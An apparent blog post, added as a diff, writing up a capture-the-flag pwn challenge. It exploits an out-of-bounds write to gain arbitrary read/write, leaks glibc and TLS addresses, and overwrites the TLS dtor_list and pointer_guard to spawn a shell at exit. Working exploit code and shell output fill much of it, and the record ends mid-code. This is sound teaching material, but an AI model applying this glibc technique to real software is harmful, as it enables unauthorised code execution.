@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>GestorCuentas: Learning to achieve RCE via TLS Storage dtor_list overwrite - lkt</title>
+    
+    
+    
+    <meta name="keywords" content="techniques">
+    
+    
+    <link rel="canonical" href="https:&#x2F;&#x2F;iokete.github.io&#x2F;blog&#x2F;gestor-cuentas-tls&#x2F;" />
+    
+    <link rel="stylesheet" href="https://iokete.github.io/style.css">
+    
+  </head>
+  <body class="theme-tokyonight">
+    
+    <header>
+      <nav>
+        <a href="https:&#x2F;&#x2F;iokete.github.io&#x2F;">/home/</a>
+
+        
+        
+        
+        <a href="https:&#x2F;&#x2F;iokete.github.io&#x2F;blog&#x2F;">&#x2F;blog&#x2F;</a>
+        
+
+        
+        
+      </nav>
+    </header>
+    <hr>
+    <main>
+      
+<section>
+  <h1>GestorCuentas: Learning to achieve RCE via TLS Storage dtor_list overwrite</h1>
+  
+  <p>published: <time>2025-11-03</time></p>
+  
+  
+  <p class="tags">
+  tags: [
+  
+  <a href="https://iokete.github.io/tags/techniques/">#techniques</a>
+  
+  ]
+  </p>
+  
+  <div>
+    <h2 id="tl-dr">TL;DR</h2>
+<p>The intended path for this challenge is to abuse an arbitrary write primitive into an <code>environ</code> leak to overwrite return address in <code>main()</code> before returning to <code>__libc_start_main()</code> (this path is also covered in this post), but I thought it was a great example binary to test an alternative way of achieving code execution that I recently learnt from <a rel="external" href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md">this</a> blog.</p>
+<p>The tricky part was that we could only write <code>15</code> bytes (per address) so, in order to write our ROP chain we had to split it in several parts overwriting <code>return address + 0x0</code>, <code>return address + 0x10</code>, etc.</p>
+<ul>
+<li>Use an Out-of-Bounds write in <code>new_account()</code> to corrupt the <code>accounts[i+1]-&gt;pass</code> pointer, creating arbitrary read and write primitives.</li>
+<li>With these primitives, leak the glibc base address and then calculate the TLS Storage base address by traversing the <code>__nptl_rtld_global-&gt;_rtld_global-&gt;_ns_loaded</code> structure.</li>
+<li>Corrupt TLS Storage's <code>dtor_list</code> with a custom destructor that calls <code>system("/bin/sh")</code> when the program exits.</li>
+</ul>
+<h2 id="challenge-description">Challenge Description</h2>
+<blockquote>
+<p>He creado un gestor de cuentas. Es la primera release asiq espero que no me haya dejado ningún bug.</p>
+</blockquote>
+<p>This challenge is part of the <a rel="external" href="https://urjc-ctf.github.io/web/">URJC CTF Introductory Course</a> final CTF.</p>
+<p>Category: <strong>pwn</strong></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="analyzing-the-source-code">Analyzing the source code</h3>
+<p>We are given a binary with the following functions:
+1. <code>_init_chall()</code>: Sets up the buffers and creates the accounts.
+2. <code>new_account()</code>: Asks for a name and a password and sets <code>initialized = 1</code> for the index given.
+3. <code>print_account()</code>: Asks for an index, and prints its <code>name</code> and <code>password</code> fields.
+4. <code>update_account()</code>: Asks for an index, name and password and updates them.</p>
+<h2 id="solution">Solution</h2>
+<h3 id="finding-the-vulnerability">Finding the vulnerability</h3>
+<p>This is the <code>struct user_t</code> where are using in the challenge:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">typedef struct</span><span style="color: #9399B2;"> {</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> id</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> initialized</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span style="color: #94E2D5;"> *</span><span>pass</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	char</span><span> name</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">16</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span><span style="color: #F9E2AF;font-style: italic;"> user_t</span><span style="color: #9399B2;">;</span></span></code></pre>
+<p>In the <code>new_account()</code> function there is a 0x11 byte overflow:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">void</span><span style="color: #89B4FA;font-style: italic;"> new_account</span><span style="color: #9399B2;">()</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	int</span><span> id </span><span style="color: #94E2D5;">=</span><span style="color: #89B4FA;font-style: italic;"> _read_id</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span>	</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">	if</span><span style="color: #9399B2;"> (</span><span style="color: #94E2D5;">!</span><span style="color: #89B4FA;font-style: italic;">is_valid_account</span><span style="color: #9399B2;">(</span><span>id</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">)){</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">		puts</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;No es un id valido o la cuenta ya está creada&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">		return</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">	}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	puts</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;Dime el nombre:&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	read</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">,</span><span> accounts</span><span style="color: #9399B2;">[</span><span>id</span><span style="color: #9399B2;">].</span><span>name</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">20</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	puts</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;Dime la contraseña:&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">	read</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">,</span><span> accounts</span><span style="color: #9399B2;">[</span><span>id</span><span style="color: #9399B2;">].</span><span>pass</span><span style="color: #9399B2;">,</span><span style="color: #FAB387;"> 16</span><span style="color: #94E2D5;">-</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>	accounts</span><span style="color: #9399B2;">[</span><span>id</span><span style="color: #9399B2;">].</span><span>initialized</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span></code></pre>
+<p>We can create <code>accounts[id]</code> and overflow its name into <code>accounts[id + 1]-&gt;pass</code>, then we can update <code>accounts[id + 1]</code> to write/read inside any pointer we want.</p>
+<p>I created some helper functions to make the exploitation process cleaner and faster.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python"><span class="giallo-l"><span style="color: #CBA6F7;">def</span><span style="color: #89B4FA;font-style: italic;"> setup_arb</span><span style="color: #9399B2;">(</span><span style="color: #EBA0AC;font-style: italic;">idx</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> int</span><span style="color: #9399B2;">,</span><span style="color: #EBA0AC;font-style: italic;"> addr</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> int</span><span style="color: #9399B2;">):</span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">  # Make sure you don&#39;t corrupt accounts[idx + 1]&#39;s initialized and index fields</span></span>
+<span class="giallo-l"><span>  payload</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">deadbeef</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> *</span><span style="color: #FAB387;"> 2</span><span style="color: #94E2D5;"> +</span><span style="color: #89B4FA;"> p32</span><span style="color: #9399B2;">(</span><span>idx</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> +</span><span style="color: #89B4FA;"> p32</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> +</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>addr</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  return</span><span> payload </span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">def</span><span style="color: #89B4FA;font-style: italic;"> arb_read</span><span style="color: #9399B2;">(</span><span style="color: #EBA0AC;font-style: italic;">idx</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> int</span><span style="color: #9399B2;">,</span><span style="color: #EBA0AC;font-style: italic;"> addr</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> int</span><span style="color: #9399B2;">):</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">   create_account</span><span style="color: #9399B2;">(</span><span>idx</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> setup_arb</span><span style="color: #9399B2;">(</span><span>idx</span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">,</span><span> addr</span><span style="color: #9399B2;">),</span><span style="color: #A6E3A1;font-style: italic;"> b</span><span style="color: #A6E3A1;">&#39;AAAA&#39;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">   print_account</span><span style="color: #9399B2;">(</span><span>idx</span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">   rlu</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">b</span><span style="color: #A6E3A1;">&#39;a es: &#39;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">   return</span><span style="color: #89B4FA;"> u64</span><span style="color: #9399B2;">(</span><span style="color: #89B4FA;">rl</span><span style="color: #9399B2;">().</span><span style="color: #89B4FA;">split</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">b</span><span style="color: #A6E3A1;">&#39;Elige&#39;</span><span style="color: #9399B2;">)[</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">].</span><span style="color: #89B4FA;">strip</span><span style="color: #9399B2;">().</span><span style="color: #89B4FA;">ljust</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">8</span><span style="color: #9399B2;">,</span><span style="color: #A6E3A1;font-style: italic;"> b</span><span style="color: #A6E3A1;">&#39;</span><span style="color: #F5C2E7;">\x00</span><span style="color: #A6E3A1;">&#39;</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">def</span><span style="color: #89B4FA;font-style: italic;"> arb_write</span><span style="color: #9399B2;">(</span><span style="color: #EBA0AC;font-style: italic;">idx</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> int</span><span style="color: #9399B2;">,</span><span style="color: #EBA0AC;font-style: italic;"> addr</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> int</span><span style="color: #9399B2;">,</span><span style="color: #EBA0AC;font-style: italic;"> payload</span><span style="color: #9399B2;">:</span><span style="color: #CBA6F7;font-style: italic;"> bytes</span><span style="color: #9399B2;">):</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">  create_account</span><span style="color: #9399B2;">(</span><span>idx</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> setup_arb</span><span style="color: #9399B2;">(</span><span>idx</span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">,</span><span> addr</span><span style="color: #9399B2;">),</span><span style="color: #A6E3A1;font-style: italic;"> b</span><span style="color: #A6E3A1;">&#39;AAAA&#39;</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">  update_account</span><span style="color: #9399B2;">(</span><span>idx</span><span style="color: #94E2D5;">+</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">,</span><span style="color: #A6E3A1;font-style: italic;"> b</span><span style="color: #A6E3A1;">&#39;AAAA&#39;</span><span style="color: #9399B2;">,</span><span> payload</span><span style="color: #9399B2;">)</span></span></code></pre>
+<p>We use this primitive to leak glibc by leaking <code>puts@got</code> address.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python"><span class="giallo-l"><span>puts</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;"> arb_read</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">,</span><span> exe</span><span style="color: #9399B2;">.</span><span>got</span><span style="color: #9399B2;">.</span><span>puts</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>libc</span><span style="color: #9399B2;">.</span><span>address</span><span style="color: #94E2D5;"> =</span><span> puts</span><span style="color: #94E2D5;"> -</span><span> libc</span><span style="color: #9399B2;">.</span><span>sym</span><span style="color: #9399B2;">.</span><span>puts</span></span>
+<span class="giallo-l"><span style="color: #FAB387;font-style: italic;">print</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">f</span><span style="color: #A6E3A1;">&quot;[*] libc leak   :   0x</span><span style="color: #F5C2E7;">{</span><span>libc</span><span style="color: #9399B2;">.</span><span>address</span><span style="color: #CBA6F7;">:x</span><span style="color: #F5C2E7;">}</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">)</span></span></code></pre><h3 id="tls-storage-dtor-list-overwrite">TLS Storage dtor_list overwrite</h3>
+<p>When a program exits via <code>return</code> or <code>exit()</code> function, libc will execute <code>__run_exit_handlers()</code>. This function will call every registered destructor (<code>dtor</code>) function and do other cleanup processes before exiting the program.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">__run_exit_handlers</span><span style="color: #9399B2;"> (</span><span style="color: #CBA6F7;">int</span><span style="color: #EBA0AC;font-style: italic;"> status</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> struct</span><span> exit_function_list </span><span style="color: #94E2D5;">**</span><span style="color: #EBA0AC;font-style: italic;">listp</span><span style="color: #9399B2;">,</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">                     bool</span><span style="color: #EBA0AC;font-style: italic;"> run_list_atexit</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;"> bool</span><span style="color: #EBA0AC;font-style: italic;"> run_dtors</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;">#ifndef</span><span style="color: #89B4FA;font-style: italic;"> SHARED</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  if</span><span style="color: #9399B2;"> (</span><span style="color: #94E2D5;">&amp;</span><span>__call_tls_dtors </span><span style="color: #94E2D5;">!=</span><span style="color: #F38BA8;"> NULL</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;">#endif</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    if</span><span style="color: #9399B2;"> (</span><span>run_dtors</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">      __call_tls_dtors</span><span style="color: #9399B2;"> ();</span></span>
+<span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span></code></pre>
+<p>This function parses <code>dtor_list</code> structures present in the TLS Storage and calls its <code>dtor_func func</code> with <code>obj</code> as its first argument. For now, this is all we need to know you can dive more in <a rel="external" href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md">this</a> post.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span> dtor_list</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span>  dtor_func func</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  void</span><span style="color: #94E2D5;"> *</span><span>obj</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  struct</span><span> link_map </span><span style="color: #94E2D5;">*</span><span>map</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  struct</span><span> dtor_list </span><span style="color: #94E2D5;">*</span><span>next</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">};</span></span></code></pre>
+<p>We can check <code>__call_tls_dtors</code> disassembly to see what is it calling</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="plain"><span class="giallo-l"><span>0x00007ffff7c45d60 &lt;+0&gt;:	endbr64 </span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d64 &lt;+4&gt;:	push   rbp</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d65 &lt;+5&gt;:	push   rbx</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d66 &lt;+6&gt;:	sub    rsp,0x8</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d6a &lt;+10&gt;:	mov    rbx,QWORD PTR [rip+0x1d401f]        # 0x7ffff7e19d90</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d71 &lt;+17&gt;:	mov    rbp,QWORD PTR fs:[rbx]   </span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d75 &lt;+21&gt;:	test   rbp,rbp                      &lt;- Tests if rbx is 0</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d78 &lt;+24&gt;:	je     0x7ffff7c45dbd &lt;__GI___call_tls_dtors+93&gt;</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d7a &lt;+26&gt;:	nop    WORD PTR [rax+rax*1+0x0]</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d80 &lt;+32&gt;:	mov    rdx,QWORD PTR [rbp+0x18]</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d84 &lt;+36&gt;:	mov    rax,QWORD PTR [rbp+0x0]  &lt;- Stores the address in rbp ([rbx]) in rax</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d88 &lt;+40&gt;:	ror    rax,0x11                 &lt;- Rotates right 0x11 bits</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d8c &lt;+44&gt;:	xor    rax,QWORD PTR fs:0x30    &lt;- XOR with a cookie</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d95 &lt;+53&gt;:	mov    QWORD PTR fs:[rbx],rdx</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d99 &lt;+57&gt;:	mov    rdi,QWORD PTR [rbp+0x8]  &lt;- [rbp+0x8] becomes rdi</span></span>
+<span class="giallo-l"><span>0x00007ffff7c45d9d &lt;+61&gt;:	call   rax                      &lt;- Calls rax</span></span></code></pre>
+<p>Looking at the disassembly we now know that we have to use our write primitive to write a pointer to our function in whatever address is at rbx, and its first argument at rbx+0x8</p>
+<p><img src="/assets/gestorcuentas/dtor1.png" alt="alt text" /></p>
+<p><img src="/assets/gestorcuentas/tls.png" alt="alt text" /></p>
+<p>The address to write to is tls+0x6e8, so recalling:</p>
+<ol>
+<li>Takes the pointer stored at <code>tls+0x8</code></li>
+<li>If it is not null, rotates its bits by 0x11 (17)</li>
+<li>Calculates a XOR with the result</li>
+<li>Calls the result</li>
+</ol>
+<p>We can find the cookie used to XOR the address at <code>pointer_guard</code> -&gt; offset <code>tls+0x740+0x30</code>
+<img src="/assets/gestorcuentas/tls.png" alt="alt text" /></p>
+<p>Our next step is to leak base TLS address. In the original post, the author adds 0x1ff898 to the libc address to leak an ld.so address close to the TLS, this approach did not work in my libc version (glibc 2.35). I spent good time looking around and I found <a rel="external" href="https://blog.rop.la/en/exploiting/2024/06/11/code-exec-part1-from-exit-to-system.html">this</a> post:</p>
+<blockquote>
+<p>The linker ld has a global variable <code>__nptl_rtld_global</code> that points to the global variable <code>_rtld_global</code>, which finally points to the <code>rtld_global</code> structure. Its first field is <code>_ns_loaded</code> [...]</p>
+</blockquote>
+<p>With multiple reads we can leak <code>_ns_loaded</code> value, which happens to be <code>0x502e0</code> bytes to TLS Storage base address. Now we just have to create a fake <code>dtor_func func</code> and <code>obj</code> and write at 0x6e8 the pointer to it. We can overwrite <code>pointer_guard</code> with 0 so the XOR does not modify our pointer (another way to handle this is to leak <code>pointer_guard</code> and calculate the XOR ourselves). Finally, we can write after 0x6e8 the address of <code>system() &lt;&lt; 17 (remember the ROR)</code> and after it the address of the string <code>/bin/sh\x00</code>.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python"><span class="giallo-l"><span style="color: #9399B2;font-style: italic;"># Modify dtor_list</span></span>
+<span class="giallo-l"><span>tls_target</span><span style="color: #94E2D5;"> =</span><span> tls</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">6e8</span><span style="color: #9399B2;font-style: italic;"> # offset checked by placing a breakpoint in __call_tls_dtors</span></span>
+<span class="giallo-l"><span>tls_func</span><span style="color: #94E2D5;"> =</span><span> tls_target</span><span style="color: #94E2D5;"> +</span><span style="color: #FAB387;"> 8</span></span>
+<span class="giallo-l"><span>tls_cookie</span><span style="color: #94E2D5;"> =</span><span> tls</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">770</span></span>
+<span class="giallo-l"><span>sh</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;font-style: italic;"> next</span><span style="color: #9399B2;">(</span><span>libc</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">search</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">b</span><span style="color: #A6E3A1;">&#39;/bin/sh</span><span style="color: #F5C2E7;">\x00</span><span style="color: #A6E3A1;">&#39;</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">## Final dtor_list setup:</span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">##  0x6e8 : tls_func (0x6f0)</span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">##  0x6f0 : system() &lt;&lt; 17 </span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">##  0x6f8 : &quot;/bin/sh&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89B4FA;">arb_write</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">6</span><span style="color: #9399B2;">,</span><span> tls_target</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>tls_func</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">arb_write</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">8</span><span style="color: #9399B2;">,</span><span> tls_cookie</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">arb_write</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">10</span><span style="color: #9399B2;">,</span><span> tls_func</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>libc</span><span style="color: #9399B2;">.</span><span>sym</span><span style="color: #9399B2;">.</span><span>system</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #FAB387;"> 17</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> +</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>sh</span><span style="color: #9399B2;">)[:</span><span style="color: #FAB387;">6</span><span style="color: #9399B2;">])</span><span style="color: #9399B2;font-style: italic;"> # We can only write 15 bytes with update_account()</span></span></code></pre>
+<p>The original author used one big write to overwrite 0x6e8 and crafted his fake <code>dtor_list</code> right after it, but this approach also works well when we only have small writes. We can modify the pointer at 0x6e8 with <em>any</em> address that has our fake <code>dtor_list</code> correctly set up. In the next example I create my fake struct inside the <code>accounts</code> array using <code>create_account()</code> (without arb write)</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python"><span class="giallo-l"><span style="color: #89B4FA;">arb_write</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">6</span><span style="color: #9399B2;">,</span><span> tls_target</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>exe</span><span style="color: #9399B2;">.</span><span>sym</span><span style="color: #9399B2;">.</span><span>accounts</span><span style="color: #94E2D5;"> +</span><span style="color: #FAB387;"> 336</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">arb_write</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">8</span><span style="color: #9399B2;">,</span><span> tls_cookie</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;">create_account</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">10</span><span style="color: #9399B2;">,</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span>libc</span><span style="color: #9399B2;">.</span><span>sym</span><span style="color: #9399B2;">.</span><span>system</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #FAB387;"> 17</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> +</span><span style="color: #89B4FA;"> flat</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;font-style: italic;">next</span><span style="color: #9399B2;">(</span><span>libc</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;">search</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;font-style: italic;">b</span><span style="color: #A6E3A1;">&#39;/bin/sh</span><span style="color: #F5C2E7;">\x00</span><span style="color: #A6E3A1;">&#39;</span><span style="color: #9399B2;">)))[:</span><span style="color: #FAB387;">6</span><span style="color: #9399B2;">],</span><span style="color: #A6E3A1;font-style: italic;"> b</span><span style="color: #A6E3A1;">&#39;AAAA&#39;</span><span style="color: #9399B2;">)</span></span></code></pre><pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"><span>pwndbg&gt; x/gx 0x71768288a000+0x6e8</span></span>
+<span class="giallo-l"><span>0x71768288a6e8:	0x00000000004041b0</span></span>
+<span class="giallo-l"><span>pwndbg&gt; x/2gx 0x00000000004041b0</span></span>
+<span class="giallo-l"><span>0x4041b0 &lt;accounts+336&gt;:	0xe2ed04ca1ae00000	0x41417176827d8678</span></span></code></pre>
+<p><img src="/assets/gestorcuentas/system.png" alt="system" /></p>
+<h3 id="getting-the-flag">Getting the flag</h3>
+<p>After executing our script we achieve code execution.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"><span>lokete@kpwn:~</span><span style="color: #9399B2;">$</span><span> python3 dtor.py </span></span>
+<span class="giallo-l"><span>[*] libc leak   :   0x75e2d1800000</span></span>
+<span class="giallo-l"><span>[*] _rtld_global    :   0x75e2d1abc040</span></span>
+<span class="giallo-l"><span>[*] _ns_loaded    :   0x75e2d1abd2e0</span></span>
+<span class="giallo-l"><span>[*] tls base    :   0x75e2d1a6d000</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">$</span><span> id</span></span>
+<span class="giallo-l"><span>uid=1000(lokete) gid=1000(lokete) groups=1000(lokete)</span></span></code></pre><h3 id="intended-solution-environ-leak-into-rop-chain">Intended solution: environ leak into rop chain</h3>
+<p>The intended solution for this challenge requires using our arbitrary read primitive to leak <code>environ</code> and calculate the address of <code>rsp</code> at the end of the <code>main</code> function, then overwrite it with our rop chain so when the program tries to return to <code>__libc_start_main</code> executes our rop chain.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="python"><span class="giallo-l"><span>puts</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;"> arb_read</span><span style="color: #9399B2;">(</span><span style="color: #FAB387;">0</span><span style="color: #9399B2;">,</span><span> exe</span><span style="color: #9399B2;">.</span><span>got</span><span style="color: #9399B2;">.</span><span>puts</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span>libc</span><span style="color: #9399B2;">.</span><span>address</span><span style="color: #94E2D5;"> =</span><span> puts</span><span style="color: #94E2D5;"> -</span><span> libc</span><span style="color: #9399B2;">.</span><span>sym</span><span style="color: #9399B2;">.</span><span>puts</span></span>
+<span class="giallo-l"></span>
